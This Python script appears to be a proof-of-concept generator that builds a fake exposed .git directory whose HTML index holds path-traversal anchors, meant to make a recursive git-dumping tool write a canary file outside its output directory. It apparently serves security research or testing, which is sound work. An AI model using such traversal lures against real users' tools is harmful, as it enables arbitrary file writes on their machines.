"""Generate a payload that lures a recursive pillager into writing
outside its output directory via path-traversal anchors in a fake
HTML directory listing (justinsteven 2022, second PoC).

Layout served by evil_server:

    payload/
      .git/
        HEAD                # so the pillager treats this as a repo
        config              # innocent
        index.html          # the lure
      canary/
        PWNED_C1            # what gets written to /canary/PWNED_C1
                            # if the pillager follows the traversal href
"""

from __future__ import annotations

import shutil
from pathlib import Path

HERE = Path(__file__).resolve().parent
PAYLOAD = HERE / "payload"

INDEX_HTML = """<!DOCTYPE html>
<html>
<head><title>Index of /.git/</title></head>
<body><h1>Index of /.git/</h1><hr><pre>
<a href="HEAD">HEAD</a>
<a href="config">config</a>
<a href="../../canary/PWNED_C1">PWNED_C1</a>
<a href="../../../canary/PWNED_C1">PWNED_C1</a>
<a href="../../../../canary/PWNED_C1">PWNED_C1</a>
<a href="../../../../../canary/PWNED_C1">PWNED_C1</a>
</pre><hr></body></html>
"""

CONFIG = """[core]
\trepositoryformatversion = 0
\tfilemode = true
\tbare = false
\tlogallrefupdates = true
"""


def main() -> None:
    if PAYLOAD.exists():
        shutil.rmtree(PAYLOAD)
    git_dir = PAYLOAD / ".git"
    git_dir.mkdir(parents=True)
    (git_dir / "HEAD").write_text("ref: refs/heads/main\n")
    (git_dir / "config").write_text(CONFIG)
    (git_dir / "index.html").write_text(INDEX_HTML)

    canary_dir = PAYLOAD / "canary"
    canary_dir.mkdir()
    (canary_dir / "PWNED_C1").write_text("PWNED via HTML traversal anchor\n")

    print(f"Built C1 payload at {PAYLOAD}")


if __name__ == "__main__":
    main()
